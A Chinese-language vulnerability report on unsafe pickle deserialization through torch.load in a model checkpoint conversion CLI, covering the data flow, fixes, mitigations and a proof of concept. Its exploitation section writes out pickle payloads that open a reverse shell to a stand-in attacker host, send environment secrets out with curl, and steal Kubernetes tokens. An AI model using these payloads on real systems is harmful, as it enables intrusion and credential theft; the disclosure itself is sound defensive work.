# VULN-CHECKPOINT-005: 不安全反序列化漏洞 (CWE-502)

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-CHECKPOINT-005 |
| **漏洞类型** | Unsafe Deserialization (不安全反序列化) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | Critical |
| **置信度** | 90% |
| **CVSS评分** | 9.8 (Critical) |
| **CVSS向量** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## 漏洞位置

```
文件: checkpoint/sora_model/convert_utils/save_load_utils.py
行号: 152
函数: load_pt
代码片段:
```

```python
# 第151-155行，load_pt 函数
def load_pt(source_path, module_name=None):
    state_dict = torch.load(source_path, map_location='cpu')
    # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    # VULN-CHECKPOINT-005: 第152行 - 不安全反序列化漏洞
    # torch.load() 未设置 weights_only 参数，默认允许 pickle 反序列化
    # source_path 来自用户控制的 CLI 参数 ConvertConfig.source_path
    if module_name:
        state_dict = state_dict[module_name]
    return state_dict
```

## 漏洞描述

### 核心问题

该漏洞位于 `checkpoint/sora_model/convert_utils/save_load_utils.py` 的 `load_pt` 函数第152行。

**关键安全问题：**
1. `torch.load(source_path, map_location='cpu')` 未设置 `weights_only` 参数
2. 在 PyTorch 2.0+ 中，默认 `weights_only=False`，使用 Python `pickle` 模块进行反序列化
3. Pickle 反序列化可以执行任意 Python 代码（通过 `__reduce__` 方法）
4. `source_path` 由用户控制的命令行参数 `ConvertConfig.source_path` 直接控制
5. 攻击者可构造恶意 `.pt` 文件实现远程代码执行 (RCE)

### 与其他相关漏洞的关系

| 漏洞ID | 文件 | 行号 | 函数 | 关系 |
|--------|------|------|------|------|
| VULN-CHECKPOINT-001 | checkpoint/vlm_model/mm_to_hf.py | 92 | load_from_mm | VLM模块，类似模式 |
| VULN-CHECKPOINT-002 | checkpoint/vlm_model/mm_to_hf.py | 107 | load_from_mm | VLM模块，类似模式 |
| VULN-CHECKPOINT-004 | checkpoint/sora_model/convert_utils/save_load_utils.py | 36 | load_from_mm | Sora模块，Megatron格式 |
| **VULN-CHECKPOINT-005** | checkpoint/sora_model/convert_utils/save_load_utils.py | **152** | **load_pt** | **本漏洞 - 单文件加载** |

**VULN-CHECKPOINT-005 的独特性：**
- `load_pt()` 直接加载单个 `.pt` 文件，无需复杂目录结构
- 比 `load_from_mm()` 更容易触发，攻击路径更直接
- 被多个 Sora 模型转换器直接调用

## 数据流分析

### 完整攻击链

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 攻击入口: CLI 命令行参数                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/convert_cli.py:13-19                                              │
│   def main():                                                                │
│       import os                                                              │
│       os.environ['JSONARGPARSE_DEPRECATION_WARNINGS'] = 'off'               │
│       jsonargparse.set_parsing_settings(docstring_parse_attribute_docstrings=True) │
│       jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)    │
│   ↓                                                                          │
│ 用户输入: python checkpoint/convert_cli.py OpenSoraPlanConverter.source_to_mm \ │
│          --source_path /path/to/malicious.pt                                 │
└─────────────────────────────────────────────────────────────────────────────┘
                                     ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 配置解析: ConvertConfig                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/sora_model/convert_utils/cfg.py:11-16                             │
│   class ConvertConfig(BaseModel):                                           │
│       source_path: str       # 用户控制的路径 ← 直接攻击入口                  │
│       lora_path: str = ""                                                    │
│       hf_dir: str = ""                                                       │
│       target_path: str                                                       │
│       target_parallel_config: ParallelConfig                                │
│                                                                              │
│ 注意: source_path 没有任何验证或路径过滤                                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                     ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 漏洞调用: 多个 Converter 方法                                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ 1. OpenSoraPlanConverter.source_to_mm()                                      │
│    checkpoint/sora_model/opensoraplan_converter.py:186-194                   │
│    def source_to_mm(self, cfg: ConvertConfig):                              │
│        state_dict = load_pt(cfg.source_path)  # ← 直接传入用户路径           │
│        ...                                                                   │
│                                                                              │
│ 2. OpenSoraPlanConverter.vae_convert()                                       │
│    checkpoint/sora_model/opensoraplan_converter.py:205-223                   │
│    def vae_convert(self, cfg: ConvertConfig):                               │
│        state_dict = load_pt(cfg.source_path)  # ← 直接传入用户路径           │
│        ...                                                                   │
│                                                                              │
│ 3. HunyuanVideoConverter.source_to_mm()                                      │
│    checkpoint/sora_model/hunyuanvideo_converter.py:203-211                   │
│    def source_to_mm(self, cfg: ConvertConfig):                              │
│        if cfg.source_path.endswith("safetensors"):                          │
│            state_dict = load_file(cfg.source_path)  # safetensors 安全       │
│        else:                                                                 │
│            state_dict = load_pt(cfg.source_path, module_name='module')       │
│            # ← .pt 文件触发漏洞                                               │
│        ...                                                                   │
│                                                                              │
│ 4. CogVideoConverter.source_to_mm()                                          │
│    checkpoint/sora_model/cogvideo_converter.py:192-206                       │
│    def source_to_mm(self, cfg: ConvertConfig):                              │
│        state_dict = load_pt(cfg.source_path, module_name="module")           │
│        # ← 直接传入用户路径                                                   │
│        ...                                                                   │
└─────────────────────────────────────────────────────────────────────────────┘
                                     ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 反序列化触发 (RCE)                                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/sora_model/convert_utils/save_load_utils.py:151-155               │
│   def load_pt(source_path, module_name=None):                               │
│       state_dict = torch.load(source_path, map_location='cpu')              │
│       # ↑ source_path 直接来自用户，无 weights_only 参数                     │
│       # ↑ 默认 weights_only=False，允许 pickle 反序列化                      │
│       # ↑ 恶意 .pt 文件被执行，触发任意代码执行                               │
│       if module_name:                                                        │
│           state_dict = state_dict[module_name]                              │
│       return state_dict                                                      │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 与 VULN-CHECKPOINT-004 的数据流对比

| 特性 | VULN-CHECKPOINT-004 | VULN-CHECKPOINT-005 |
|------|---------------------|---------------------|
| **函数** | `load_from_mm()` | `load_pt()` |
| **输入** | 目录路径 | 单文件路径 |
| **结构要求** | 需要 Megatron 目录结构 | 只需单个 .pt 文件 |
| **路径构造** | 多级目录拼接 | 直接使用用户路径 |
| **攻击复杂度** | 中等 | 低 |
| **触发条件** | `mm_to_hf`, `resplit`, `merge_lora_to_base` | `source_to_mm`, `vae_convert` |

### 完整数据流追踪

```
[IN] CLI Argument: --source_path malicious.pt
    ↓
checkpoint/convert_cli.py:19
    jsonargparse.auto_cli(Commandable.subclasses)
    ↓
checkpoint/__init__.py:18-24
    注册的 Converter: HunyuanVideoConverter, OpenSoraPlanConverter, CogVideoConverter...
    ↓
checkpoint/sora_model/opensoraplan_converter.py:187
    state_dict = load_pt(cfg.source_path)
    ↓
checkpoint/sora_model/convert_utils/save_load_utils.py:152
    torch.load(source_path, map_location='cpu')
    ↓
[OUT] Pickle Deserialization → Arbitrary Code Execution (RCE)
```

## 漏洞利用分析

### 利用条件

| 条件 | 说明 | 可满足性 |
|------|------|----------|
| **攻击者可控制 source_path** | 通过 `--source_path` CLI 参数指定 | ✓ 完全可控 |
| **攻击者可构造恶意 .pt 文件** | 使用 pickle 反序列化 gadget | ✓ 可构造 |
| **受害者执行转换命令** | 社会工程或 CI/CD 场景 | ◐ 需要触发条件 |
| **目标系统有 torch 模块** | MindSpeed-MM 依赖 | ✓ 默认满足 |
| **只需单个文件** | 无需复杂目录结构 | ✓ 易于构造 |

### 漏洞利用步骤

**步骤 1: 构造恶意 checkpoint 文件**

```python
import torch
import pickle
import os

class MaliciousPickle:
    """恶意 pickle payload 类"""
    
    def __reduce__(self):
        # 示例：执行任意命令
        # 实际攻击中可使用反向 shell、持久化后门等
        return (os.system, ('id > /tmp/pwned_checkpoint_005',))

# 构造恶意模型字典 - 最简单的形式
malicious_checkpoint = {
    'predictor.weight': torch.randn(1024, 1024),
    '__malicious_payload__': MaliciousPickle()  # 恶意 payload
}

# 保存为 .pt 文件 - 只需这一个文件
torch.save(malicious_checkpoint, 'malicious_model.pt')
```

**步骤 2: 诱导用户执行转换命令**

```bash
# 场景 1: OpenSoraPlan 转换
python checkpoint/convert_cli.py OpenSoraPlanConverter.source_to_mm \
    --source_path ./malicious_model.pt \
    --target_path ./converted_output \
    --target_parallel_config.tp_size 1 \
    --target_parallel_config.pp_layers []

# 场景 2: HunyuanVideo 转换 (非 safetensors)
python checkpoint/convert_cli.py HunyuanVideoConverter.source_to_mm \
    --source_path ./malicious_model.pt \
    --target_path ./converted_output \
    --target_parallel_config.tp_size 1

# 场景 3: CogVideo 转换
python checkpoint/convert_cli.py CogVideoConverter.source_to_mm \
    --source_path ./malicious_model.pt \
    --target_path ./converted_output \
    --target_parallel_config.tp_size 1 \
    --target_parallel_config.pp_layers []
```

**步骤 3: 触发漏洞**

当 `torch.load()` 执行时：
1. Pickle 反序列化器读取 `.pt` 文件
2. 遇到 `MaliciousPickle` 对象时调用其 `__reduce__` 方法
3. `__reduce__` 返回 `(os.system, ('id > /tmp/pwned_checkpoint_005',))`
4. Python 执行 `os.system('id > /tmp/pwned_checkpoint_005')`
5. 恶意代码被执行

### 高级利用场景

#### 1. 反向 Shell Payload

```python
import socket
import subprocess

class ReverseShell:
    def __init__(self, ip='attacker.com', port=4444):
        self.ip = ip
        self.port = port
    
    def __reduce__(self):
        return (
            subprocess.Popen,
            (['/bin/bash', '-c', 
              f'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'],)
        )

# 构造恶意 checkpoint
malicious_checkpoint = {
    'model.weight': torch.randn(512, 512),
    '__shell__': ReverseShell('10.10.14.5', 4444)
}
torch.save(malicious_checkpoint, 'malicious_hunyuan.pt')
```

#### 2. 环境变量窃取

```python
class EnvExfiltration:
    def __reduce__(self):
        cmd = '''
        # 窃取所有敏感环境变量
        curl -X POST -d "$(env | grep -E 'API_KEY|TOKEN|SECRET|PASSWORD|AWS_')" \
            http://attacker.com/collect
        '''
        return (os.system, (cmd,))
```

#### 3. Kubernetes/API 凭证窃取

```python
class K8sTokenExfil:
    def __reduce__(self):
        cmd = '''
        # 窃取 Kubernetes service account token
        if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
            curl -H "Authorization: Bearer $TOKEN" \
                https://attacker.com/k8s-token -d "$TOKEN"
        fi
        '''
        return (os.system, (cmd,))
```

### 供应链攻击场景

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Sora 模型供应链攻击向量                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ 1. 模型仓库投毒                                                              │
│    ┌────────────────────────────────────────────────────────────────────┐   │
│    │ 攻击者在公开模型仓库发布 "预训练" Sora/Hunyuan/CogVideo 模型        │   │
│    │ 用户下载并使用 source_to_mm 方法转换                                │   │
│    │ 转换过程中触发 RCE                                                   │   │
│    │                                                                      │   │
│    │ 攻击场景:                                                            │   │
│    │ - 发布在 Hugging Face Hub                                           │   │
│    │ - 标题为 "HunyuanVideo 微调版本"、"CogVideo 优化版"                 │   │
│    │ - 用户下载 .pt 文件后执行权重转换                                    │   │
│    │                                                                      │   │
│    │ 优势: 只需单个 .pt 文件，无需复杂目录结构                            │   │
│    └────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│ 2. CI/CD 管道攻击                                                           │
│    ┌────────────────────────────────────────────────────────────────────┐   │
│    │ 攻击者在训练流程输出中注入恶意 checkpoint                            │   │
│    │ 自动化转换脚本执行 source_to_mm                                     │   │
│    │ CI 环境中以高权限执行恶意代码                                        │   │
│    │                                                                      │   │
│    │ 攻击场景:                                                            │   │
│    │ - GitHub Actions 自动转换                                            │   │
│    │ - 内部训练管道被污染                                                 │   │
│    │ - 共享 artifact 仓库投毒                                             │   │
│    └────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│ 3. 模型分发攻击                                                             │
│    ┌────────────────────────────────────────────────────────────────────┐   │
│    │ 攻击者入侵模型分发平台                                              │   │
│    │ 替换正版模型文件为恶意版本                                          │   │
│    │ 用户下载 "官方" 模型时实际获得恶意文件                              │   │
│    │                                                                      │   │
│    │ 攻击场景:                                                            │   │
│    │ - Hugging Face Hub 账户被入侵                                       │   │
│    │ - ModelScope 镜像被污染                                             │   │
│    │ - CDN 被中间人攻击                                                   │   │
│    └────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 受影响组件

### 直接受影响的调用链

```
checkpoint/convert_cli.py:main()
  → jsonargparse.auto_cli(Commandable.subclasses)
    → OpenSoraPlanConverter.source_to_mm(cfg)
      → load_pt(cfg.source_path) [VULN-CHECKPOINT-005: 第152行]
        → torch.load(source_path) # 无 weights_only
    
    → OpenSoraPlanConverter.vae_convert(cfg)
      → load_pt(cfg.source_path) [第210行]
    
    → HunyuanVideoConverter.source_to_mm(cfg)
      → load_pt(cfg.source_path, module_name='module') [第208行]
      → 或 load_file(cfg.source_path) # safetensors 路径安全
    
    → CogVideoConverter.source_to_mm(cfg)
      → load_pt(cfg.source_path, module_name="module") [第194行]
```

### 所有调用 load_pt 的转换方法

| 方法 | 文件位置 | 行号 | Converter | 用途 |
|------|----------|------|-----------|------|
| `source_to_mm` | opensoraplan_converter.py | 187 | OpenSoraPlanConverter | 源格式 → Megatron |
| `vae_convert` | opensoraplan_converter.py | 210 | OpenSoraPlanConverter | VAE 模型转换 |
| `source_to_mm` | hunyuanvideo_converter.py | 208 | HunyuanVideoConverter | 源格式 → Megatron |
| `source_to_mm` | cogvideo_converter.py | 194 | CogVideoConverter | 源格式 → Megatron |

### 受影响的 Sora 模型转换器

| 转换器类 | 文件 | 版本参数 | 受影响方法 |
|----------|------|----------|------------|
| `OpenSoraPlanConverter` | opensoraplan_converter.py | v1.2, v1.3, v1.5 | source_to_mm, vae_convert |
| `HunyuanVideoConverter` | hunyuanvideo_converter.py | t2v, i2v, t2v-lora, i2v-lora | source_to_mm |
| `CogVideoConverter` | cogvideo_converter.py | t2v, i2v | source_to_mm |

### Converter 注册机制

```python
# checkpoint/__init__.py:17-24
# sora model converter - 这些都通过 jsonargparse.auto_cli 注册
from checkpoint.sora_model.hunyuanvideo_converter import HunyuanVideoConverter
from checkpoint.sora_model.opensoraplan_converter import OpenSoraPlanConverter
from checkpoint.sora_model.wan_converter import WanConverter
from checkpoint.sora_model.cogvideo_converter import CogVideoConverter
from checkpoint.sora_model.lumina_converter import LuminaConverter
from checkpoint.sora_model.vace_converter import VACEConverter
from checkpoint.sora_model.bagel_converter import BagelConverter

# 所有这些 Converter 继承自 Commandable
# 被 jsonargparse.auto_cli 自动注册为可用的 CLI 命令
```

## 与项目安全文档的对照

根据 `docs/zh/SECURITYNOTE.md`：

> 当使用 PyTorch 提供的 torch.load()方法加载模型文件时，一个关键的安全风险点在于设置 weights_only=False。在此设置下：
> 
> 特定框架实现： Megatron-LM 框架的原生代码调用、MindSpeed MM提供的权重转换脚本（将 Megatron 格式转换为 Hugging Face 格式）中，会显式地将 weights_only=False。这意味着这些加载操作继承了 pickle模块的潜在危险，允许执行任意代码。
> 
> 攻击面： 攻击者可能通过构造恶意的模型文件，利用 pickle的反序列化漏洞实现远程代码执行 (RCE)。

**这确认了漏洞的真实性和项目已知风险状态。**

## 修复建议

### 短期修复（紧急）

**方案 1：强制使用 `weights_only=True`**

```python
# 修复前 (第152行)
state_dict = torch.load(source_path, map_location='cpu')

# 修复后
state_dict = torch.load(source_path, map_location='cpu', weights_only=True)
```

**注意事项：**
- `weights_only=True` 仅加载张量数据，拒绝任意 Python 对象
- PyTorch 2.0+ 支持 `weights_only=True`
- 需要测试确保现有 checkpoint 格式兼容
- 注意 CVE-2025-32434：即使 weights_only=True，旧版 PyTorch (< 2.5.1) 的 tar 格式仍有漏洞

**方案 2：添加路径验证和安全检查**

```python
def load_pt(source_path, module_name=None):
    import os
    
    # 1. 路径规范化，防止路径遍历
    source_path = os.path.realpath(source_path)
    
    # 2. 检查文件存在性
    if not os.path.exists(source_path):
        raise FileNotFoundError(f"Checkpoint file not found: {source_path}")
    
    # 3. 检查文件扩展名
    if not source_path.endswith('.pt') and not source_path.endswith('.pth'):
        raise ValueError(f"Invalid checkpoint format: {source_path}")
    
    # 4. 使用 weights_only=True
    state_dict = torch.load(source_path, map_location='cpu', weights_only=True)
    
    if module_name:
        state_dict = state_dict[module_name]
    return state_dict
```

### 中期修复

**方案 1：优先使用 safetensors 格式**

参考 HunyuanVideoConverter 的实现：

```python
def source_to_mm(self, cfg: ConvertConfig):
    if cfg.source_path.endswith("safetensors"):
        state_dict = load_file(cfg.source_path)  # 安全
    else:
        state_dict = load_pt(cfg.source_path, module_name='module')  # 需修复
```

建议为所有 Converter 实现类似的 safetensors 优先策略：

```python
def load_pt_safe(source_path, module_name=None):
    """安全的 checkpoint 加载函数"""
    from safetensors.torch import load_file
    import os
    
    # 优先尝试 safetensors 格式
    if source_path.endswith('.safetensors'):
        state_dict = load_file(source_path)
        if module_name:
            state_dict = state_dict[module_name]
        return state_dict
    
    # 对于 .pt 文件，强制使用 weights_only=True
    source_path = os.path.realpath(source_path)
    if not os.path.exists(source_path):
        raise FileNotFoundError(f"Checkpoint not found: {source_path}")
    
    state_dict = torch.load(source_path, map_location='cpu', weights_only=True)
    
    if module_name:
        state_dict = state_dict[module_name]
    return state_dict
```

**方案 2：添加沙箱隔离执行**

```python
def load_pt_sandboxed(source_path, module_name=None):
    """在受限环境中加载 checkpoint"""
    import subprocess
    import json
    
    # 使用子进程隔离执行，限制权限
    result = subprocess.run(
        ['python', '-c', '''
import torch
import sys
import json

path = sys.argv[1]
try:
    state_dict = torch.load(path, map_location='cpu', weights_only=True)
    keys = list(state_dict.keys())
    print(json.dumps({'keys': keys, 'success': True}))
except Exception as e:
    print(json.dumps({'error': str(e), 'success': False}))
''', os.path.realpath(source_path)],
        capture_output=True,
        text=True,
        timeout=60,  # 添加超时限制
        env={'PYTHONDONTWRITEBYTECODE': '1'}  # 防止字节码注入
    )
    
    if result.returncode != 0:
        raise RuntimeError(f"Checkpoint loading failed: {result.stderr}")
    
    # 实际数据需要通过安全的 IPC 方式传输
    # 这里仅为示例
    return result
```

### 长期修复

**架构改进：**

1. **强制 safetensors 格式策略**
   ```python
   # checkpoint_security_policy.py
   
   class CheckpointSecurityPolicy:
       """Checkpoint 安全策略"""
       
       ALLOWED_EXTENSIONS = ['.safetensors', '.pt.safe']
       BLOCKED_EXTENSIONS = ['.pt', '.pth', '.pickle', '.pkl']
       
       def validate_checkpoint(self, path: str) -> bool:
           """验证 checkpoint 格式安全性"""
           ext = os.path.splitext(path)[1].lower()
           
           if ext in self.BLOCKED_EXTENSIONS:
               raise SecurityError(
                   f"Blocked checkpoint format: {ext}. "
                   f"Please use safetensors format instead."
               )
           
           if ext not in self.ALLOWED_EXTENSIONS:
               raise SecurityError(
                   f"Unknown checkpoint format: {ext}. "
                   f"Only {self.ALLOWED_EXTENSIONS} are allowed."
               )
           
           return True
   ```

2. **添加签名验证机制**
   ```python
   def load_verified_checkpoint(path: str, signature: str):
       """加载经过签名验证的 checkpoint"""
       import hashlib
       
       # 1. 计算文件哈希
       with open(path, 'rb') as f:
           file_hash = hashlib.sha256(f.read()).hexdigest()
       
       # 2. 验证签名 (简化示例)
       expected_signature = verify_signature(file_hash)
       if signature != expected_signature:
           raise SecurityError("Checkpoint signature verification failed")
       
       # 3. 使用安全方式加载
       return torch.load(path, weights_only=True)
   ```

3. **更新 CLI 参数验证**
   ```python
   # 在 ConvertConfig 中添加验证
   class ConvertConfig(BaseModel):
       source_path: str
       
       @validator('source_path')
       def validate_source_path(cls, v):
           # 检查路径安全性
           path = os.path.realpath(v)
           
           # 检查是否在允许的目录范围内
           allowed_dirs = ['/data/models', '/home/user/models']
           if not any(path.startswith(d) for d in allowed_dirs):
               raise ValueError(f"source_path must be in allowed directories")
           
           # 优先推荐 safetensors
           if path.endswith('.pt') or path.endswith('.pth'):
               warnings.warn(
                   "Using .pt format is deprecated. "
                   "Please convert to safetensors format for better security."
               )
           
           return v
   ```

## 缓解措施

在修复完成前，建议采取以下缓解措施：

### 1. 访问控制

```bash
# 确保 checkpoint 文件权限严格
chmod 640 /path/to/model.pt
chown model_user:model_group /path/to/model.pt

# 使用专用低权限用户运行转换工具
sudo useradd -m -s /bin/bash checkpoint_converter
sudo su - checkpoint_converter
python checkpoint/convert_cli.py ...
```

### 2. 来源验证

```bash
# 仅从可信来源获取 checkpoint
# 使用 SHA-256 校验和验证

# 验证下载的模型文件
expected_sha256="abc123def456..."
actual_sha256=$(sha256sum downloaded_model.pt | cut -d' ' -f1)

if [ "$expected_sha256" != "$actual_sha256" ]; then
    echo "Checksum verification failed! File may be tampered."
    exit 1
fi
```

### 3. 环境隔离

```bash
# 使用 Docker 容器隔离执行
docker run --rm \
    -v /path/to/model.pt:/model:ro \
    -v /path/to/output:/output \
    --network none \
    --cap-drop ALL \
    mindspeed-mm:convert_cli \
    python checkpoint/convert_cli.py ...

# 或使用 firejail
firejail --noprofile --private --net=none \
    python checkpoint/convert_cli.py ...
```

### 4. 监控检测

```bash
# 监控异常进程创建
auditctl -a always,exit -F arch=b64 -S execve -k checkpoint_load

# 使用专门的 pickle 安全扫描工具
# 例如: pickle-scan, picklescan
pip install picklescan
picklescan -p /path/to/model.pt
```

## 验证 POC

```python
#!/usr/bin/env python3
"""
VULN-CHECKPOINT-005 漏洞验证 POC

此 POC 仅用于安全测试和漏洞验证目的。
请勿用于非法活动。

使用方法:
1. 创建恶意 checkpoint 文件
2. 诱导用户使用该 checkpoint 执行转换命令
3. 观察 /tmp/vuln_checkpoint_005_poc 文件是否创建

特点: 只需单个 .pt 文件，无需复杂目录结构
"""

import os
import torch
from pathlib import Path

class ProofOfConcept:
    """POC payload 类，演示 pickle 反序列化漏洞"""
    
    def __reduce__(self):
        # 安全的 POC payload - 仅创建标记文件
        return (
            os.system,
            ('echo "VULN-CHECKPOINT-005 POC executed at $(date)" > /tmp/vuln_checkpoint_005_poc',)
        )

def create_malicious_checkpoint(output_file: str = "./malicious_model.pt"):
    """创建恶意 checkpoint 文件"""
    
    output_path = Path(output_file)
    
    # 构造恶意模型字典
    # 最简单的形式 - 无需复杂目录结构
    malicious_checkpoint = {
        'predictor.blocks.0.weight': torch.randn(1024, 1024),
        'predictor.blocks.0.bias': torch.randn(1024),
        '__poc_payload__': ProofOfConcept()  # 恶意 payload
    }
    
    # 保存恶意 checkpoint
    torch.save(malicious_checkpoint, output_path)
    
    print(f"[+] 恶意 checkpoint 已创建: {output_path}")
    print(f"[+] 文件大小: {output_path.stat().st_size} bytes")
    print()
    print("[+] 触发漏洞的命令示例:")
    print()
    print("场景 1: OpenSoraPlanConverter")
    print(f"    python checkpoint/convert_cli.py OpenSoraPlanConverter.source_to_mm \\")
    print(f"        --source_path {output_path} \\")
    print(f"        --target_path ./converted_output \\")
    print(f"        --target_parallel_config.tp_size 1 \\")
    print(f"        --target_parallel_config.pp_layers []")
    print()
    print("场景 2: HunyuanVideoConverter")
    print(f"    python checkpoint/convert_cli.py HunyuanVideoConverter.source_to_mm \\")
    print(f"        --source_path {output_path} \\")
    print(f"        --target_path ./converted_output \\")
    print(f"        --target_parallel_config.tp_size 1")
    print()
    print("场景 3: CogVideoConverter")
    print(f"    python checkpoint/convert_cli.py CogVideoConverter.source_to_mm \\")
    print(f"        --source_path {output_path} \\")
    print(f"        --target_path ./converted_output \\")
    print(f"        --target_parallel_config.tp_size 1 \\")
    print(f"        --target_parallel_config.pp_layers []")
    
    return output_path

if __name__ == "__main__":
    print("=" * 70)
    print("VULN-CHECKPOINT-005: Unsafe Deserialization POC")
    print("checkpoint/sora_model/convert_utils/save_load_utils.py:152")
    print("=" * 70)
    print()
    print("[!] 特点: 只需单个 .pt 文件，比 VULN-CHECKPOINT-004 更易触发")
    print()
    create_malicious_checkpoint()
    print()
    print("[!] 执行上述命令后，检查 /tmp/vuln_checkpoint_005_poc 文件")
    print("[!] 如果文件存在，则漏洞已成功触发")
```

## 相关漏洞

| 漏洞ID | 文件 | 行号 | 函数 | 关系 |
|--------|------|------|------|------|
| VULN-CHECKPOINT-001 | checkpoint/vlm_model/mm_to_hf.py | 92 | load_from_mm | VLM模块，类似模式 |
| VULN-CHECKPOINT-002 | checkpoint/vlm_model/mm_to_hf.py | 107 | load_from_mm | VLM模块，类似模式 |
| VULN-CHECKPOINT-004 | checkpoint/sora_model/convert_utils/save_load_utils.py | 36 | load_from_mm | 同文件，Megatron格式 |
| **VULN-CHECKPOINT-005** | checkpoint/sora_model/convert_utils/save_load_utils.py | **152** | **load_pt** | **本漏洞 - 单文件加载** |

### 漏洞对比矩阵

| 特性 | VULN-001 | VULN-002 | VULN-004 | VULN-005 |
|------|----------|----------|----------|----------|
| **模块** | VLM | VLM | Sora | Sora |
| **函数** | load_from_mm | load_from_mm | load_from_mm | load_pt |
| **输入类型** | 目录 | 目录 | 目录 | 单文件 |
| **攻击复杂度** | 中 | 中 | 中 | **低** |
| **触发方法** | mm_to_hf | mm_to_hf | mm_to_hf, resplit | source_to_mm |
| **目录结构需求** | 需要 | 需要 | 需要 | **不需要** |

## 参考资料

1. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
2. [PyTorch torch.load Documentation](https://pytorch.org/docs/main/generated/torch.load.html)
3. [CVE-2025-32434: PyTorch tar format RCE bypass](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
4. [Python Pickle Security Considerations](https://docs.python.org/3/library/pickle.html#module-pickle)
5. [MindSpeed-MM Security Note](../../docs/zh/SECURITYNOTE.md)
6. [Safetensors: A secure alternative to pickle](https://github.com/huggingface/safetensors)
7. [Picklescan - Pickle security scanner](https://github.com/mmaitre314/picklescan)

## 时间线

| 日期 | 事件 |
|------|------|
| 2025-01-12 | 漏洞代码提交 (checkpoint 模块创建) |
| 2025-04-20 | 漏洞发现与深度分析 |
| 2025-04-20 | 漏洞验证与报告生成 |

---

**报告生成时间**: 2025-04-20  
**分析工具**: OpenCode Vulnerability Scanner  
**分析人员**: Security Research Team
